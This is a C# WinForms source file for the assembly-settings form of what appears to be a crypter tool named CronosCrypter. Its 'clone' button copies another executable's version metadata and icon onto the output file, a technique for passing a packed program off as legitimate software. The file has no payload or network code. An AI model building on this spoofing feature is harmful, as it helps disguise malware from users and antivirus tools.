using CronosCrypter.Core;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Toolbelt.Drawing;

namespace CronosCrypter.Forms
{
    /// <summary>
    /// Assembly form allows user to change its file assembly.
    /// </summary>
    public partial class AssemblyFrm : Form
    {
        // Required for moving window
        bool mouseDown;
        private Point offset;

        public Settings _settings;
        public Assembly _assemblySettings;
        public AssemblyFrm(Settings settings)
        {
            _settings = settings;
        }

        public AssemblyFrm(Assembly assembly)
        {
            InitializeComponent();
            _assemblySettings = assembly;
        }

        #region Code
        private void CreateTempIconPath(string source, string output)
        {
            using (FileStream fileStream = new FileStream(output, FileMode.Create))
            {
                IconExtractor.Extract1stIconTo(source, fileStream);
            }
        }
        private void LoadCurrentSettings()
        {
            titleTxt.Text = (_assemblySettings.assemblyTitle ?? string.Empty);
            productTxt.Text = (_assemblySettings.assemblyProductName ?? string.Empty);
            descriptionTxt.Text = (_assemblySettings.assemblyDescription ?? string.Empty);
            companyTxt.Text = (_assemblySettings.assemblyCompany ?? string.Empty);
            productTxt.Text = (_assemblySettings.assemblyProductName ?? string.Empty);
            copyrightTxt.Text = (_assemblySettings.assemblyCopyright ?? string.Empty);
            versionTxt.Text = (_assemblySettings.assemblyVersion ?? "0.0.0.0");
            iconBox.ImageLocation = (_assemblySettings.iconPath ?? string.Empty);
            iconTxt.Text = (_assemblySettings.iconPath ?? string.Empty);
        }

        #endregion

        #region Panels
        /// <summary>
        /// This region is responsible for moving panel and window
        /// </summary>

        private void topPanel_MouseUp(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }

        private void topPanel_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseDown == true)
            {
                Point currentScreenPos = PointToScreen(e.Location);
                Location = new Point(currentScreenPos.X - offset.X, currentScreenPos.Y - offset.Y);
            }

        }

        private void topPanel_MouseDown(object sender, MouseEventArgs e)
        {
            offset.X = e.X;
            offset.Y = e.Y;
            mouseDown = true;
        }
        #endregion

        #region Buttons

        private void exitBox_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void minimizeBox_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void cloneBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if(openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    CreateTempIconPath(openFileDialog.FileName, Path.GetFullPath(openFileDialog.FileName + ".ico"));
                    _assemblySettings.iconPath = Path.GetFullPath(openFileDialog.FileName + ".ico");
                    FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
                    titleTxt.Text = (versionInfo.InternalName ?? string.Empty);
                    productTxt.Text = (versionInfo.ProductName ?? string.Empty);
                    descriptionTxt.Text = (versionInfo.FileDescription ?? string.Empty);
                    companyTxt.Text = (versionInfo.CompanyName ?? string.Empty);
                    productTxt.Text = (versionInfo.ProductName ?? string.Empty);
                    copyrightTxt.Text = (versionInfo.LegalCopyright ?? string.Empty);
                    versionTxt.Text = string.Concat(new string[]
                    {
                        versionInfo.FileMajorPart.ToString(),
                        ".",
                        versionInfo.FileMinorPart.ToString(),
                        ".",
                        versionInfo.FileBuildPart.ToString(),
                        ".",
                        versionInfo.FilePrivatePart.ToString()
                    });

                    iconBox.Image = Bitmap.FromHicon(new Icon(_assemblySettings.iconPath, new Size(40, 40)).Handle);
                    iconTxt.Text = openFileDialog.FileName + ".ico";
                    _assemblySettings.iconPath = Path.GetFullPath(openFileDialog.FileName + ".ico");
                }
            }
        }

        private void iconBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon (.ico)|*.ico";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    iconTxt.Text = ofd.FileName;
                    iconBox.ImageLocation = ofd.FileName;
                }
            }
        }

        private void clearBtn_Click(object sender, EventArgs e)
        {
            iconTxt.Text = string.Empty;
            productTxt.Text = string.Empty;
            descriptionTxt.Text = string.Empty;
            companyTxt.Text = string.Empty;
            productTxt.Text = string.Empty;
            copyrightTxt.Text = string.Empty;
            versionTxt.Text = string.Empty;
            titleTxt.Text = string.Empty;
            iconBox.Image = null;
        }

        private void saveBtn_Click(object sender, EventArgs e)
        {
            _assemblySettings.usingAssembly = true;
            _assemblySettings.assemblyTitle = titleTxt.Text;
            _assemblySettings.assemblyProductName = productTxt.Text;
            _assemblySettings.assemblyDescription = descriptionTxt.Text;
            _assemblySettings.assemblyCompany = companyTxt.Text;
            _assemblySettings.assemblyProductName = productTxt.Text;
            _assemblySettings.assemblyCopyright = copyrightTxt.Text;
            _assemblySettings.assemblyVersion = versionTxt.Text;
            _assemblySettings.iconPath = iconTxt.Text;
            base.DialogResult = DialogResult.OK;
            base.Close();
        }

        #endregion
    }
}
